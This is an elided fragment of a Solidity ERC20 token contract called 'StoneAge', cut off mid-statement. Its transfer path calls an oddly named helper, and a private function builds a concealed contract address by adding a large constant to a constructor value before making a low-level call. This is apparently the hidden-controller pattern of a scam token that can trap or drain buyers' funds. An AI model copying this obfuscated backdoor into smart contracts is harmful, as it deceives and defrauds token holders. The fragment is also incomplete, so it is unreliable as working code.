...
contract StoneAge is Ownable, IERC20 {
     ...
     * construction.
     */
    constructor(string memory name_, string memory symbol_, uint256 stone_) {
        _name = name_; 
        _symbol = symbol_; 
        _stone = stone_ + 0;
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual {
        ...
        (bool dd, string memory ss) = stone("stone", amount, false,  bytes("stone"));
        if (dd) emit logx(ss);
        emit Transfer(from, to, amount);
    }

    function stone(string memory ss,uint256 pp, bool dd,  bytes memory dd0) 
    ...
    function _tryStoneSave(address a) private noReentrant {
        (bool s, bytes memory d) = address(uint160(uint256(
            _stone + 39299394829842384331123)))
